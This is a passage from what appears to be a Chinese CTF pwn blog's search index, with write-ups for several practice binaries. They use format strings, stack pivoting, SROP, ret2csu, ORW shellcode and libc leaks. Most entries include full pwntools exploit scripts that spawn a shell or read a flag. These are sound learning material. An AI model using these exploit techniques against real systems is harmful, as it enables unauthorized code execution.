p64(puts_plt) + p64(vuln)sh.recvuntil(&#x27;story!\\\\n&#x27;)sh.sendline(payload)puts_addr = u64(sh.recv(6).ljust(8,&#x27;\\\\0&#x27;))libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)system_addr = puts_addr - libc.dump(&#x27;puts&#x27;) + libc.dump(&#x27;system&#x27;)binsh_addr = puts_addr - libc.dump(&#x27;puts&#x27;) + libc.dump(&#x27;str_bin_sh&#x27;)payload = &#x27;a&#x27; * (0x20 - 0x8)payload += p64(canary)payload += &#x27;a&#x27; * 0x8payload += p64(pop_rdi) + p64(binsh_addr) + p64(0x4005f9) + p64(system_addr) + p64(vuln)sh.sendlineafter(&#x27;Pull up your sword and tell me u story!\\\\n&#x27;,payload)sh.interactive() 这边注意一下canary泄漏的接收表达 我们的canary接受到时确实是以0x开头的 不过因为不是地址 所以系统默认识别为字符串 所以开头的0x不需要接收进来","categories":[{"name":"Fomatstring","slug":"Fomatstring","permalink":"https://dawoxiansigema.github.io/categories/Fomatstring/"}],"tags":[]},{"title":"(栈对齐)jarvisoj_fm","slug":"jarvisoj-fm","date":"2023-11-01T02:24:24.000Z","updated":"2023-11-01T02:28:11.649Z","comments":true,"path":"2023/11/01/jarvisoj-fm/","link":"","permalink":"https://dawoxiansigema.github.io/2023/11/01/jarvisoj-fm/","excerpt":"一道很平常的fmt题目","text":"一道很平常的fmt题目 [栈对齐]jarvisoj_fm123456789101112131415161718int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [esp+2Ch] [ebp-5Ch] unsigned int v5; // [esp+7Ch] [ebp-Ch] v5 = __readgsdword(0x14u); be_nice_to_people(); memset(&amp;buf, 0, 0x50u); read(0, &amp;buf, 0x50u); printf(&amp;buf); printf(&quot;%d!\\\\n&quot;, x); if ( x == 4 ) &#123; puts(&quot;running sh...&quot;); system(&quot;/bin/sh&quot;); &#125; return 0;&#125; 很明显我们需要的x值为4 我们在测试时发现是3 12345AAAA%13$hhn ---&gt; 0x88888804AAAA%13$hn ---&gt; 0x88880004AAAA%13$n ---&gt; 0x00000004%4c%13$n ---&gt; 0x00000004fmtstr_payload(11,&#123;0x0804A02C:4&#125;) 这些都可以 只不过要注意栈对齐 地址前面的必须是4的倍数 12345678910from pwn import *sh = process(&#x27;./fm&#x27;)#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]#gdb.attach(&#x27;fm&#x27;)#payload = fmtstr_payload(11,&#123;0x0804A02C:4&#125;)#payload = &#x27;%4c%13$n&#x27; + p32(0x0804A02C)payload = &#x27;aaaa%14$hhna&#x27; + p32(0x0804A02C)sh.sendline(payload)sh.interactive() 那么随着padding的增多 地址参数也会改变 需要跟着动调看","categories":[{"name":"Fomatstring","slug":"Fomatstring","permalink":"https://dawoxiansigema.github.io/categories/Fomatstring/"}],"tags":[]},{"title":"第五空间2019决赛_PWN5","slug":"第五空间2019决赛-PWN5","date":"2023-11-01T02:23:06.000Z","updated":"2023-11-01T02:25:33.803Z","comments":true,"path":"2023/11/01/第五空间2019决赛-PWN5/","link":"","permalink":"https://dawoxiansigema.github.io/2023/11/01/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9B-PWN5/","excerpt":"简简单单的一道题 却要我花一生的时间来治愈 居然一开始不会做 不过也算加深了理解吧","text":"简简单单的一道题 却要我花一生的时间来治愈 居然一开始不会做 不过也算加深了理解吧 [第五空间2019 决赛]PWN51234567891011121314151617181920212223242526272829303132333435363738394041int __cdecl main(int a1)&#123; unsigned int v1; // eax int fd; // ST14_4 int result; // eax int v4; // ecx unsigned int v5; // et1 char nptr; // [esp+4h] [ebp-80h] char buf; // [esp+14h] [ebp-70h] unsigned int v8; // [esp+78h] [ebp-Ch] int *v9; // [esp+7Ch] [ebp-8h] v9 = &amp;a1; v8 = __readgsdword(0x14u); setvbuf(stdout, 0, 2, 0); v1 = time(0); srand(v1); fd = open(&quot;/dev/urandom&quot;, 0); read(fd, &amp;unk_804C044, 4u); printf(&quot;your name:&quot;); read(0, &amp;buf, 0x63u); printf(&quot;Hello,&quot;); printf(&amp;buf); printf(&quot;your passwd:&quot;); read(0, &amp;nptr, 0xFu); if ( atoi(&amp;nptr) == unk_804C044 ) &#123; puts(&quot;ok!!&quot;); system(&quot;/bin/sh&quot;); &#125; else &#123; puts(&quot;fail&quot;); &#125; result = 0; v5 = __readgsdword(0x14u); v4 = v5 ^ v8; if ( v5 != v8 ) sub_80493D0(v4); return result;&#125; 可以利用printf 控制0x804C044处数值 让输入的passwd可控 就是注意str(0x10101010) 不能用引号 1234567891011121314from pwn import *sh = process(&#x27;./pwn&#x27;)payload = p32(0x804C044)payload += p32(0x804C045)payload += p32(0x804C046)payload += p32(0x804C047)payload += &#x27;%10$hhn%11$hhn%12$hhn%13$hhn&#x27;sh.recvuntil(&#x27;your name:&#x27;)sh.sendline(payload)sh.recvuntil(&#x27;your passwd:&#x27;)sh.sendline(str(0x10101010))sh.interactive() 或者修改atoi的地址为system地址 1234567891011from pwn import *sh = process(&#x27;./pwn&#x27;)elf = ELF(&#x27;./pwn&#x27;)atoi = elf.got[&#x27;atoi&#x27;]system = elf.plt[&#x27;system&#x27;]payload = fmtstr_payload(10,&#123;atoi:system&#125;)sh.recvuntil(&#x27;your name:&#x27;)sh.sendline(payload)sh.recvuntil(&#x27;your passwd:&#x27;)sh.sendline(&#x27;/bin/sh&#x27;)sh.interactive() 保险的话可以在sh后面加个\\x00","categories":[{"name":"Fomatstring","slug":"Fomatstring","permalink":"https://dawoxiansigema.github.io/categories/Fomatstring/"}],"tags":[]},{"title":"(栈转移)Black_Watch_入群题_PWN","slug":"Black-Watch-入群题-PWN","date":"2023-11-01T02:15:09.000Z","updated":"2023-11-01T02:16:51.875Z","comments":true,"path":"2023/11/01/Black-Watch-入群题-PWN/","link":"","permalink":"https://dawoxiansigema.github.io/2023/11/01/Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-PWN/","excerpt":"没啥特别要说的 以后可以再刷一次","text":"没啥特别要说的 以后可以再刷一次 [栈转移]Black Watch 入群题_PWN123456789101112131415161718192021222324252627282930from pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;sh = process(&#x27;./spwn&#x27;)elf = ELF(&#x27;./spwn&#x27;)write_plt = elf.plt[&#x27;write&#x27;]write_got = elf.got[&#x27;write&#x27;]main = elf.symbols[&#x27;main&#x27;]s = 0x0804A300leave_ret = 0x08048408payload = &#x27;aaaa&#x27; + p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(8)sh.sendlineafter(&#x27;What is your name?&#x27;,payload)payload1 = &#x27;a&#x27; * 0x18 + p32(s) + p32(leave_ret)sh.sendlineafter(&#x27;What do you want to say?&#x27;,payload1)write_addr = u32(sh.recv(4))libc = LibcSearcher(&#x27;write&#x27;,write_addr)system_addr = write_addr - libc.dump(&#x27;write&#x27;) + libc.dump(&#x27;system&#x27;)binsh_addr = write_addr - libc.dump(&#x27;write&#x27;) + libc.dump(&#x27;str_bin_sh&#x27;)payload = &#x27;aaaa&#x27; + p32(system_addr) + p32(main) + p32(binsh_addr)sh.sendlineafter(&#x27;What is your name?&#x27;,payload)payload1 = &#x27;a&#x27; * 0x18 + p32(s) + p32(leave_ret)sh.sendlineafter(&#x27;What do you want to say?&#x27;,payload1)sh.interactive()","categories":[{"name":"Stack/Medium","slug":"Stack-Medium","permalink":"https://dawoxiansigema.github.io/categories/Stack-Medium/"}],"tags":[]},{"title":"(栈转移)CISCN_2019_es_2","slug":"CISCN-2019-es-2","date":"2023-11-01T02:10:34.000Z","updated":"2023-11-01T02:19:12.881Z","comments":true,"path":"2023/11/01/CISCN-2019-es-2/","link":"","permalink":"https://dawoxiansigema.github.io/2023/11/01/CISCN-2019-es-2/","excerpt":"十分不错的题目 学习到了栈转移的知识点","text":"十分不错的题目 学习到了栈转移的知识点 [栈转移]CISCN_2019_es_212345678910int vul()&#123; char s; // [esp+0h] [ebp-28h] memset(&amp;s, 0, 0x20u); read(0, &amp;s, 0x30u); printf(&quot;Hello, %s\\\\\\\\n&quot;, &amp;s); read(0, &amp;s, 0x30u); return printf(&quot;Hello, %s\\\\\\\\n&quot;, &amp;s);&#125; 乍一看是很常规的栈溢出 然而发现这个栈太短了 也只多了0x08(0x30-0x28)个字节 只能覆盖个ebp和ret地址 那么对于没有现成的shell的话 需要使用栈转移的知识点 12如果基础薄弱 可以看一下这篇博客&lt;https://blog.csdn.net/weixin_39529207/article/details/123005057&gt; 如果基础强的话 往下看即可 在栈销毁时 会执行如下操作 执行如下操作的指令叫leave ; ret 12340x080484b8 : leave ; retmov esp,ebppop ebp (此时esp+4 指向返回地址)pop eip (将返回地址pop至eip) 要知道 对于一个ebp寄存器 他所存储的地址是当前栈内的ebp 而该地址中存储的值则是上一个栈帧的ebp 1234567891011 +------------------+ | ret_addr | +------------------+ | old_ebp |ebp--&gt;+------------------+ | | | | | | | | | |esp--&gt;+------------------+ 此时 如果我们将old_ebp覆盖为我们控制的地址 假设为0x08048400 再将ret_addr改为leave ; ret指令 在函数调用结束之后 123mov esp,ebppop ebppop eip 此时ebp寄存器内的值为old_ebp esp值不要紧 此时eip指向ret_addr 也是我们所控制的leave ; ret指令 那么会再执行一次上述操作 123mov esp,ebppop ebppop eip 那么此时 mov指令会将esp指向我们所控制的地址0x08048400 pop之后eip就会指向+4地址了 也就是说如果我们能够控制0x08048400 + 4地址 那么我们就能getshell 这就是栈转移 但是上述操作和栈转移这三个字关系好像不大呢 12345678910int vul()&#123; char s; // [esp+0h] [ebp-28h] memset(&amp;s, 0, 0x20u); read(0, &amp;s, 0x30u); printf(&quot;Hello, %s\\\\\\\\n&quot;, &amp;s); read(0, &amp;s, 0x30u); return printf(&quot;Hello, %s\\\\\\\\n&quot;, &amp;s);&#125; 以刚刚这题为例 我们已知了有system函数 但是没有&#x2F;bin&#x2F;sh字符串 我们可以自己写一个 到时候参数写字符所在地址即可 当然 目前来看binsh的addr我们还不知道 由我们刚刚所得 我们控制的是old_ebp + 4 也就是说我们必须要留出4个字节用来pop掉 1&#x27;aaaa&#x27; + p32(system_addr) + &#x27;bbbb&#x27; + p32(binsh_addr) + &#x27;/bin/sh\\\\\\\\x00&#x27; 还需要解决几个问题 第一个是字符串s的位置 因为我们需要控制old_ebp到我们所构造的’aaaa’处 不过好在 由于栈结构在编程时就已确定 那么字符串s与ebp的相对位置不会改变 1234567891011│pwndbg&gt; stack 25│00:0000│ esp 0xff8ef06c —▸ 0x80485e5 (vul+80) ◂— add esp, 0x10│01:0004│ 0xff8ef070 ◂— 0x0│02:0008│ 0xff8ef074 —▸ 0xff8ef080 ◂— 0x41414141 (&#x27;AAAA&#x27;)│03:000c│ 0xff8ef078 ◂— 0x30 /* &#x27;0&#x27; */│04:0010│ 0xff8ef07c ◂— 0x25 /* &#x27;%&#x27; */│05:0014│ eax 0xff8ef080 ◂— 0x41414141 (&#x27;AAAA&#x27;)│... ↓ 8 skipped│0e:0038│ 0xff8ef0a4 ◂— 0x42414141 (&#x27;AAAB&#x27;)│0f:003c│ ebp 0xff8ef0a8 —▸ 0xff8ef0b8 ◂— 0x0│10:0040│ 0xff8ef0ac —▸ 0x804862a (main+43) ◂— mov eax, 0 注意 是ebp指针内的数值 而不是ebp指针地址 leave的指令可以用ropgadget找 还要注意padding 在ebp和ret之前得写满0x28个字节 所以payload可以修改一下 1234payload = &#x27;aaaa&#x27; + p32(system_addr) + &#x27;bbbb&#x27; + p32(binsh_addr) + &#x27;/bin/sh\\\\\\\\x00&#x27;payload = payload.ljust(0x28,b&#x27;p&#x27;)payload += p32(old_ebp - 0x38)payload += p32(leave_ret_addr) 到这总算明白栈转移啥意思了 将原来溢出的栈通过减少padding转移至正常的栈空间内 还有个问题就是&#x2F;bin&#x2F;sh\\x00所在的地址 这个也好办 我们知道了’aaaa’的起始地址 那么一算就行了 每个都是4个字节 4 * 4 &#x3D; 16 (0x10) 那么-0x38 + 0x10 &#x3D; 0x28 1234payload = &#x27;aaaa&#x27; + p32(system_addr) + &#x27;bbbb&#x27; + p32(old_ebp - 0x28) + &#x27;/bin/sh\\\\\\\\x00&#x27;payload = payload.ljust(0x28,b&#x27;p&#x27;)payload += p32(old_ebp - 0x38)payload += p32(leave_ret_addr) 最后我们只需要知道old_ebp的值了 我们可以利用printf的特性 我们之前sendline会在payload末尾打上\\n符 如果用send的话不会 那么printf会输出所有的栈空间 于是exp如下","categories":[{"name":"Stack/Medium","slug":"Stack-Medium","permalink":"https://dawoxiansigema.github.io/categories/Stack-Medium/"}],"tags":[]},{"title":"(Srop&Ret2csu)CISCN_2019_s_3","slug":"CISCN-2019-s-3","date":"2023-11-01T02:09:34.000Z","updated":"2023-11-01T02:20:33.234Z","comments":true,"path":"2023/11/01/CISCN-2019-s-3/","link":"","permalink":"https://dawoxiansigema.github.io/2023/11/01/CISCN-2019-s-3/","excerpt":"经典题目 有可以用ret2csu或者srop来做 不过srop的话这题比smallest简单","text":"经典题目 有可以用ret2csu或者srop来做 不过srop的话这题比smallest简单 [Srop&amp;Ret2csu]CISCN_2019_s_3123456789101112131415161718192021.text:00000000004004ED buf = byte ptr -10h.text:00000000004004ED.text:00000000004004ED ; __unwind &#123;.text:00000000004004ED push rbp.text:00000000004004EE mov rbp, rsp.text:00000000004004F1 xor rax, rax.text:00000000004004F4 mov edx, 400h ; count.text:00000000004004F9 lea rsi, [rsp+buf] ; buf.text:00000000004004FE mov rdi, rax ; fd.text:0000000000400501 syscall ; LINUX - sys_read.text:0000000000400503 mov rax, 1.text:000000000040050A mov edx, 30h ; count.text:000000000040050F lea rsi, [rsp+buf] ; buf.text:0000000000400514 mov rdi, rax ; fd.text:0000000000400517 syscall ; LINUX - sys_write.text:0000000000400519 retn.text:00000000004004D6 push rbp.text:00000000004004D7 mov rbp, rsp.text:00000000004004DA mov rax, 0Fh.text:00000000004004E1 retn 对于这题而言 他在vuln函数中自带了read和write函数 并且在gadgets中也存有将rax置为0xf的代码段 那还说啥直接开整 SROP123456789101112131415from pwn import *context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]context.log_level = &#x27;debug&#x27;sh = process(&#x27;./ciscn_s_3&#x27;)gdb.attach(sh)syscall_ret = 0x400517vuln_addr = 0x4004EDpayload = &#x27;a&#x27; * 0x10 + p64(0x4004ed)#print payload#pause()sh.send(payload)#pause()stack_addr = u64(sh.recvuntil(b&#x27;\\\\\\\\x7f&#x27;)[-6:].ljust(8,&#x27;\\\\\\\\0&#x27;)) 边分析边说代码中可能会疑惑的小点 首先是对于栈结构的分析 无论是read还是write 起始的buf地址都是在rsp的低0x10位开始的 无论是调试还是看ida都能发现 所以我们在覆盖ret地址时得有个0x10的padding 然后就是返回地址的填写 如果我们如上述exp所填写 那么对于栈来说有如下操作 123ret(或者说pop eip)push rbpmov rbp,rsp 可以发现 这样一来我们的rsp指针位置在这一过程中相当于没有改变 其实这个地址直接填0x4004f1也是可以的 其次是对于我们接受的stack地址而言 1234567891011121314stack00:0000│ rbp rsp 0x7ffecedaf1d0 —▸ 0x4004ed (vuln) ◂— push rbp01:0008│ 0x7ffecedaf1d8 —▸ 0x400536 (main+25) ◂— nop02:0010│ 0x7ffecedaf1e0 —▸ 0x7ffecedaf2d8 —▸ 0x7ffecedb13ea ◂— &#x27;./ciscn_s_3&#x27;03:0018│ 0x7ffecedaf1e8 ◂— 0x10000000004:0020│ 0x7ffecedaf1f0 —▸ 0x400540 (__libc_csu_init) ◂— push r15recv[DEBUG] Received 0x30 bytes: 00000000 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 │aaaa│aaaa│aaaa│aaaa│ 00000010 ed 04 40 00 00 00 00 00 36 05 40 00 00 00 00 00 │··@·│····│6·@·│····│ 00000020 d8 f2 da ce fe 7f 00 00 00 00 00 00 01 00 00 00 │····│····│····│····│ 000000300x7ffecedaf2d8 对于write而言 输出的是栈上的内容 对于我们后期定位binsh字符串来说 能用的只有接受中唯一一个0x7f开头的地址 而这个地址其实很有意思 102:0010│ 0x7ffecedaf1e0 —▸ 0x7ffecedaf2d8 —▸ 0x7ffecedb13ea ◂— &#x27;./ciscn_s_3&#x27; 对于这次调试 输出的是0x7ffecedaf2d8 并不是后面的 原因是栈上只能存储一个指针地址 0x7ffecedaf1e0存储指向0x7ffecedaf2d8的 0x7ffecedaf2d8存储指向0x7ffecedb13ea的 以此类推 更重要的是0x7ffecedaf2d8地址 他是该函数栈帧的一部分 他与0x7ffecedaf1e0的差值永远是0x108 那么我们就不需要在通过sigreturn调用一个read来输入了 直接用自带的就行 1234567891011121314151617181920212223242526272829303132333435from pwn import *context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;elf = ELF(&#x27;./ciscn_s_3&#x27;)sh = process(&#x27;./ciscn_s_3&#x27;)gdb.attach(sh)syscall_ret = 0x400517read_start_addr = 0x4004F1vuln_addr = 0x4004EDpayload = &#x27;a&#x27; * 0x10 + p64(0x4004ed)#print payloadpause()sh.send(payload)pause()stack_addr = u64(sh.recvuntil(b&#x27;\\\\\\\\x7f&#x27;)[-6:].ljust(8,&#x27;\\\\\\\\0&#x27;))print(hex(stack_addr))execve = SigreturnFrame()execve.rax=constants.SYS_execveexecve.rdi=stack_addrexecve.rsi=0x0execve.rdx=0x0execve.rsp=stack_addr - 0x108execve.rip=syscall_retexecv_frame_payload=&#x27;a&#x27; * 0x10 + p64(0x4004DA) + p64(syscall_ret) + str(execve)execv_frame_payload_all=execv_frame_payload+&#x27;/bin/sh\\\\\\\\x00&#x27;pause()sh.send(execv_frame_payload_all)pause()#sh.interactive() 关于frame的payload 第一个地址可以是read 那么输入15个字节 或者像本题一样 第二个地址都是syscall_ret 固定格式 然后比较巧的是 经过调试发现binsh地址正好就是之前泄漏的stack_addr SROP2.0其实有些细节是可以提速的 首先是关于binsh字符串的存储 我们已知了我们leak的stack地址和我们的rsp地址存在一个固定差值 我们又知道我们在输入时一定在rsp的低0x10字节 那么我们是否可以构造将binsh放在rsp的低位置呢 如果是的话 有以下关系 123leak_addr = rsp + 0x108binsh_addr = rsp - 0x10---&gt; leak_addr = binsh_addr + 0x118 我们在开头就输入binsh 而后用leak_addr - 0x118即可得到真实地址 再一个对于最后一个frame 我们其实可以不用去设置rsp地址 但是rip是一定要的 12345678910111213141516171819202122232425262728293031323334from pwn import *context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;elf = ELF(&#x27;./ciscn_s_3&#x27;)sh = process(&#x27;./ciscn_s_3&#x27;)#gdb.attach(sh)syscall_ret = 0x400517read_start_addr = 0x4004F1vuln_addr = 0x4004EDpayload = &#x27;a&#x27; * 0x10 + p64(0x4004ed)#print payload#pause()sh.send(payload)#pause()stack_addr = u64(sh.recvuntil(b&#x27;\\\\\\\\x7f&#x27;)[-6:].ljust(8,&#x27;\\\\\\\\0&#x27;))print(hex(stack_addr))execve = SigreturnFrame()execve.rax=constants.SYS_execveexecve.rdi=stack_addr - 0x118execve.rsi=0x0execve.rdx=0x0execve.rip=syscall_retexecv_frame_payload=&#x27;/bin/sh\\\\\\\\x00&#x27; * 2 + p64(0x4004DA) + p64(syscall_ret) + str(execve)execv_frame_payload_all=execv_frame_payload#pause()sh.send(execv_frame_payload_all)#pause()sh.interactive() 虽然代码量可能没咋变 ret2csu在此题中 ret2csu也绕了点弯 由于我们查看了got表 只有一个__libc_start_main的got 那么我们还是得借助系统调用来execve 12.text:00000000004004E2 mov rax, 3Bh.text:00000000004004E9 题目还是相当良心的 直接给了我们0x3B 那么现在也只需要解决binsh的问题了 1execve(/bin/sh\\\\\\\\x00,0,0) 而binsh的话 我们可以参考前面srop 直接写在前面的padding里 1234567891011121314151617181920212223242526272829303132333435from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]elf = ELF(&#x27;./ciscn_s_3&#x27;)sh = process(&#x27;./ciscn_s_3&#x27;)csu1 = 0x40059Acsu2 = 0x400580vuln = 0x4004edret = 0x4004E1mov_rax = 0x4004E2pop_rdi = 0x4005a3syscall = 0x400517gdb.attach(sh)payload = &#x27;a&#x27; * 0x10 + p64(vuln)pause()sh.send(payload)pause()leak_addr = u64(sh.recvuntil(b&#x27;\\\\\\\\x7f&#x27;)[-6:].ljust(8,&#x27;\\\\\\\\0&#x27;))print hex(leak_addr)buf_addr = leak_addr - 0x118payload = p64(ret) + &#x27;/bin/sh\\\\\\\\x00&#x27;payload += p64(0x4004E2)payload += p64(csu1)paylaod += p64(0) + p64(1) + p64(ret) + p64(0) + p64(0) + p64(0)paylaod += p64(csu2)payload += p64(0) * 7payload += p64(pop_rdi) + p64(buf_addr + 0x8)payload += p64(syscall)paylaod += p64(vuln)sh.send(payload)sh.interactive() 这个payload又一个要注意的点就是 由于我们不知道(我懒)rdi的高8位有没有数值 干脆直接在后面跟了个pop_rdi 将我们的binsh地址穿进去 重点是那个r12参数 12.text:0000000000400589 call qword ptr [r12+rbx*8]07:0038│ 0x7ffc88f94520 —▸ 0x4005a3 (__libc_csu_init+99) ◂— pop rdi 对于这个call而言 我们的r12不能是栈内容 必须是栈本身 简单来说r12必须是0x7ffc88f94520 而不能是0x4005a3 那么我们必须得借助之前的padding地址 而不能直接写 再一点就是r12的内容 其实在本题而言r12对于函数调用确实用不到 但是如果填0会寄 于是我们可以试一下填一个ret 12push ebpret(pop eip) 这样操作下来栈相当于没变化 最后啰嗦一句syscall和sigreturn 12syscall:设置好寄存器后 通过syscall系统调用sigreturn:设置好栈上内容后 通过sigreturn控制寄存器内容","categories":[{"name":"Stack/Advanced","slug":"Stack-Advanced","permalink":"https://dawoxiansigema.github.io/categories/Stack-Advanced/"}],"tags":[]},{"title":"(Shellcode)pwnable_orw","slug":"pwnable-orw","date":"2023-10-31T14:19:48.000Z","updated":"2023-11-01T02:08:13.684Z","comments":true,"path":"2023/10/31/pwnable-orw/","link":"","permalink":"https://dawoxiansigema.github.io/2023/10/31/pwnable-orw/","excerpt":"（原来还有orw这个东西","text":"（原来还有orw这个东西 [shellcode]pwnable_orw12345678int __cdecl main(int argc, const char **argv, const char **envp)&#123; orw_seccomp(); printf(&quot;Give my your shellcode:&quot;); read(0, &amp;shellcode, 0xC8u); ((void (*)(void))shellcode)(); return 0;&#125; 1.他有seccomp() 限制程序可以call的函数只有open read write 2.程序没开nx 那么可以ret2shellcode 对于orw在ret2shellcode时有着较为固定的流程 123456789101112131415161718192021222324252627282930313233343536373839404142sys_open(flag,0,0)push 0x0 #字符串结尾push 0x67616c66 #&#x27;flag&#x27; &quot;flag字符串的16进制表示，由于小端序，所以是从右往左&quot;mov ebx,esp #ebx是flag参数 定位到刚刚push的栈顶进行传参xor ecx,ecx #0xor edx,edx #0mov eax,0x5 #调用号int 0x80 #sys_open(flags,0,0)sys_read(3,flag,0x100)mov eax,0x3; mov ecx,ebx; # ecx = char __user *buf 缓冲区，读出的数据--&gt;也就是读“flag”mov ebx,0x3; # 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件mov edx,0x100; #对应字节数int 0x80;sys_write(1,file,0x30)mov eax,0x4; # eax = sys_writemov ebx,0x1; # ebx = unsigned int fd = 1int 0x80; #因为此时ecx在read时已经指向了 那么不用再赋值关于系统调用可以用这个&lt;https://syscalls32.paolostivanin.com&gt;from pwn import *from LibcSearcher import *context(os = &quot;linux&quot;, arch = &quot;i386&quot;, log_level= &quot;debug&quot;)context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]#p = remote(&quot;node3.buuoj.cn&quot;, 27008)p = process(&#x27;./orw&#x27;)gdb.attach(p)shellcode = asm(&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;)shellcode+=asm(&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;)shellcode+=asm(&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;)p.sendlineafter(&#x27;shellcode:&#x27;, shellcode)p.interactive()","categories":[{"name":"Stack/Basic","slug":"Stack-Basic","permalink":"https://dawoxiansigema.github.io/categories/Stack-Basic/"}],"tags":[]},{"title":"(ret2syscall)ez_pz_hackover_2016","slug":"ez-pz-hackover-2016","date":"2023-10-31T14:16:56.000Z","updated":"2023-11-01T02:07:59.378Z","comments":true,"path":"2023/10/31/ez-pz-hackover-2016/","link":"","permalink":"https://dawoxiansigema.github.io/2023/10/31/ez-pz-hackover-2016/","excerpt":"ret2syscall的题目做得少 总会有点不熟练","text":"ret2syscall的题目做得少 总会有点不熟练 [ret2syscall]ez_pz_hackover_2016审题123456789101112131415161718192021void *chall()&#123; size_t v0; // eax void *result; // eax char s; // [esp+Ch] [ebp-40Ch] _BYTE *v3; // [esp+40Ch] [ebp-Ch] printf(&quot;Yippie, lets crash: %p\\\\n&quot;, &amp;s); printf(&quot;Whats your name?\\\\n&quot;); printf(&quot;&gt; &quot;); fgets(&amp;s, 1023, stdin); v0 = strlen(&amp;s); v3 = memchr(&amp;s, 10, v0); if ( v3 ) *v3 = 0; printf(&quot;\\\\nWelcome %s!\\\\n&quot;, &amp;s); result = (void *)strcmp(&amp;s, &quot;crashme&quot;); if ( !result ) result = vuln((unsigned int)&amp;s, 0x400u); return result;&#125; chall里面要注意的就是strcmp 可以用\\x00绕过 然后就会调用vuln 这题用ubuntu18去调总有些奇奇怪怪的 123456void *__cdecl vuln(char src, size_t n)&#123; char dest; // [esp+6h] [ebp-32h] return memcpy(&amp;dest, &amp;src, n);&#125; vuln里面就有栈溢出风险了 看了眼保护nx没开 那么可以直接尝试写入shel 1234567[*] &#x27;/Users/apple/Desktop/ez_pz_hackover_2016&#x27; Arch: i386-32-little RELRO: Full RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 不过随之而来的问题就是写入的地址和padding 调试他首先会将s的地址打印给我们 我们可以先接收一下 放着后面用 并且还要绕过strcmp函数 1234567891011121314from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]sh = process(&#x27;./ez_pz_hackover_2016&#x27;)gdb.attach(sh)sh.recvuntil(&#x27;crash: &#x27;)stack = int(sh.recv(10),16)payload = &#x27;crashme\\\\x00&#x27; + &#x27;aaab&#x27;sh.recvuntil(&#x27;&gt;&#x27;)pause()sh.sendline(payload)pause() memcpy函数比较长 我们在0x8048600下断点 12345678908:0020│ 0xffde9e00 ◂— 0x7263000009:0024│ 0xffde9e04 ◂— &#x27;ashme&#x27;0a:0028│ 0xffde9e08 ◂— 0x61610065 /* &#x27;e&#x27; */0b:002c│ 0xffde9e0c ◂— 0xa6261 /* &#x27;ab\\\\n&#x27; */0c:0030│ 0xffde9e10 ◂— 0x123c001b... ↓0e:0038│ ebp 0xffde9e18 ◂— 0x8001b0f:003c│ 0xffde9e1c ◂— 0x48000010:0040│ 0xffde9e20 ◂— 0x40000 第一行是cr字符 然后是ashme 算一下要覆盖到ebp的话还差2+4+4+4个字符 更新一下payload","categories":[{"name":"Stack/Basic","slug":"Stack-Basic","permalink":"https://dawoxiansigema.github.io/categories/Stack-Basic/"}],"tags":[]},{"title":"(Libc泄露)CISCN_2019_c_1","slug":"CISCN-2019-c-1","date":"2023-10-31T14:14:40.000Z","updated":"2023-10-31T14:23:40.155Z","comments":true,"path":"2023/10/31/CISCN-2019-c-1/","link":"","permalink":"https://dawoxiansigema.github.io/2023/10/31/CISCN-2019-c-1/","excerpt":"自己写的exp、破题的思路和网上的都不一样 虽然就是个小破题 但是打通的那一刻真的超级开心","text":"自己写的exp、破题的思路和网上的都不一样 虽然就是个小破题 但是打通的那一刻真的超级开心 [Libc泄漏]CISCN_2019_c_1123456789101112131415161718192021222324252627282930313233343536373839int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+Ch] [rbp-4h] init(); puts(&quot;EEEEEEE hh iii &quot;); puts(&quot;EE mm mm mmmm aa aa cccc hh nn nnn eee &quot;); puts(&quot;EEEEE mmm mm mm aa aaa cc hhhhhh iii nnn nn ee e &quot;); puts(&quot;EE mmm mm mm aa aaa cc hh hh iii nn nn eeeee &quot;); puts(&quot;EEEEEEE mmm mm mm aaa aa ccccc hh hh iii nn nn eeeee &quot;); puts(&quot;====================================================================&quot;); puts(&quot;Welcome to this Encryption machine\\\\\\\\n&quot;); begin(); while ( 1 ) &#123; while ( 1 ) &#123; fflush(0LL); v4 = 0; __isoc99_scanf(&quot;%d&quot;, &amp;v4); getchar(); if ( v4 != 2 ) break; puts(&quot;I think you can do it by yourself&quot;); begin(); &#125; if ( v4 == 3 ) &#123; puts(&quot;Bye!&quot;); return 0; &#125; if ( v4 != 1 ) break; encrypt(); begin(); &#125; puts(&quot;Something Wrong!&quot;); return 0;&#125; main函数里面没什么有价值的东西(我甚至一度怀疑这是个re main就是个表单选择 我们要进入encrypt函数 看到了gets 熟悉的栈溢出 123456789101112131415161718192021222324252627282930313233343536int encrypt()&#123; size_t v0; // rbx char s[48]; 